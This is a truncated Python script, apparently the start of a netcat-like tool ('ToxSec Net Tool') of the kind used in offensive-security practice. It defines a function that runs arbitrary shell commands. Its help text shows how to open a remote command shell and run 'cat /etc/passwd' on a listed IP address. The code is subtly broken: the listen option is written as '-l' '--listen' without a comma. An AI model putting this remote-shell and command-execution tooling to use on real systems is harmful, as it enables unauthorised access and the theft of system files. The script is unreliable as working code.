import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd),
                                     stderr=subprocess.STDOUT)
    return output.decode()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='ToxSec Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(''' Example:
        netcat.py -t 10.10.127.208 -p 6666 -l -c # command shell
        netcat.py -t 10.10.127.208 -p 6666 -l -u=test.txt # print to file
        netcat.py -t 10.10.127.208 -p 6666 -l -e=\"cat /etc/passwd\" # execute command
        echo 'ABC' | ./netcat.py -t 10.10.127.208 -p 155 # echo text to server port 155
        netcat.py -t 10.10.127.208 -p 5555 # connect to server
        '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l' '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=6666, help='specified port')
    